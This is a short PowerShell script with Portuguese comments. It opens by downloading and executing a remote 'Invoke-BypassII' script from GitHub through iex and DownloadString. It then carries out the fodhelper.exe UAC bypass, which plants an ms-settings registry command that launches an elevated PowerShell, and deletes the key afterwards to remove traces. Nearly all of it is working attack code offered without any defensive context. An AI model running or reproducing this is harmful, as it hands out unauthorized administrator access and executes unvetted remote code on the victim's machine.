iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EugeneBelford1995/Invoke-BypassII/main/Invoke-BypassII.ps1'))

# Comando que será executado no PowerShell admin – APENAS ABRE O POWERSHELL
$program = "powershell.exe -WindowStyle Normal -NoExit"

# Cria as chaves de registro
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force

# Dispara o bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Normal
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

# ... (código do bypass admin) ...
